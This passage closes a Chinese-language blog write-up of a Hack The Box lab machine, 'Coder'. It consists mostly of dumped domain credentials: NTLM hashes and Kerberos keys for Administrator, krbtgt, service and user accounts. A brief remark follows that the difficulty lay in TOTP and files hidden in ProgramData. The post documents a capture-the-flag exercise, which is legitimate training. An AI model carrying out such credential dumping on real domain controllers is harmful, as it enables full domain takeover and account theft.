class="line">coder.htb\c.cage:1107:aad3b435b51404eeaad3b435b51404ee:3ab6e9f70dbc0d19623be042d224b993:::</span><br><span class="line">coder.htb\j.briggs:1108:aad3b435b51404eeaad3b435b51404ee:e38976c0b20e3e41e9c62da792115a33:::</span><br><span class="line">coder.htb\l.kang:1109:aad3b435b51404eeaad3b435b51404ee:b8aba4878e4777864b292731ac88b4cd:::</span><br><span class="line">coder.htb\s.blade:1110:aad3b435b51404eeaad3b435b51404ee:4e4a79beed7d042627d0a7b10f5d008a:::</span><br><span class="line">coder.htb\svc_teamcity:5101:aad3b435b51404eeaad3b435b51404ee:4c5a6890e09834a6834dbf7a76bf20cb:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:86a6a038ff6058c56a74e2e35008f6b037b8e7bca8c75cc5ee4495f77d0be71e</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:6d63b0853502cbbc8c8e40ad8fe88fa3</span><br><span class="line">Administrator:des-cbc-md5:37feabd9d9575785</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:aeb517a1efec8b79479cb1432e734555bc1039bcbd77bcdc39234b37199a70d3</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:2bab4af978e4cee0b58fa1d377d35981</span><br><span class="line">krbtgt:des-cbc-md5:100489b5839798cb</span><br><span class="line">coder.htb\e.black:aes256-cts-hmac-sha1-96:ccb6c47af9a05d91e7610fe396cd8ffcc0e51279a2eee253fab1fb40536a5a85</span><br><span class="line">coder.htb\e.black:aes128-cts-hmac-sha1-96:650ad0d49ab4bcff325a7f2a846d433f</span><br><span class="line">coder.htb\e.black:des-cbc-md5:89290da2c2cd16ec</span><br><span class="line">coder.htb\c.cage:aes256-cts-hmac-sha1-96:ea9cc2144c3106e9325b1ddda16c27c644d9f9b7e95098581ceba19c75d9b296</span><br><span class="line">coder.htb\c.cage:aes128-cts-hmac-sha1-96:2cff13848c9e8d07339a6ab41bf72088</span><br><span class="line">coder.htb\c.cage:des-cbc-md5:fd6d578510df1af1</span><br><span class="line">coder.htb\j.briggs:aes256-cts-hmac-sha1-96:ec3ac8b99094903a3ca006a725dc0867666347efb4baf04d8b2f8b0305ab65ee</span><br><span class="line">coder.htb\j.briggs:aes128-cts-hmac-sha1-96:39050d78545c40645fa889c13200f8f7</span><br><span class="line">coder.htb\j.briggs:des-cbc-md5:7f5286d35def8f15</span><br><span class="line">coder.htb\l.kang:aes256-cts-hmac-sha1-96:d7eb03d2695638c4ba423cd88e22dcdd7c0f6da996e5d6ed3af6c6d7e6c56661</span><br><span class="line">coder.htb\l.kang:aes128-cts-hmac-sha1-96:25ad8331aa0fa2b26e220040b9e55937</span><br><span class="line">coder.htb\l.kang:des-cbc-md5:571a573e61ced640</span><br><span class="line">coder.htb\s.blade:aes256-cts-hmac-sha1-96:ceeab374597121113f3bdee3aab1fed0522506909b2f1ec24dfe36045eb3c252</span><br><span class="line">coder.htb\s.blade:aes128-cts-hmac-sha1-96:69f4cada02748fba948e4c15460add9e</span><br><span class="line">coder.htb\s.blade:des-cbc-md5:26eca8ad9deaada2</span><br><span class="line">coder.htb\svc_teamcity:aes256-cts-hmac-sha1-96:b6c7ed72b4434a89c56295df6b42ca68937702dda15f90f23423e8712abce030</span><br><span class="line">coder.htb\svc_teamcity:aes128-cts-hmac-sha1-96:d6604e2fadb40bbf71708e7b9c9734a7</span><br><span class="line">coder.htb\svc_teamcity:des-cbc-md5:264ab5645ed91c86</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:a43b686fdd5f2e576ad834c5b1d4327dd5bdbd3ec579677343a2c6c43c8f1740</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:22192237a3cb399c19a6b469dcd1cba8</span><br><span class="line">DC01$:des-cbc-md5:cb9758c162ba4943</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>

<hr>
<p>难点是totp和C盘下呢个programData里藏东西，整体来说不算难。</p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/07/14/htb-wp-Outbound/"
      title="【season-8】 htb Outbound wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【season-8】 htb Outbound wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/07/06/htb-wp-Voleur/"
      title="【season-8】 htb Voleur wp"
     >

    <p class="title-text">
      
        【season-8】 htb Voleur wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


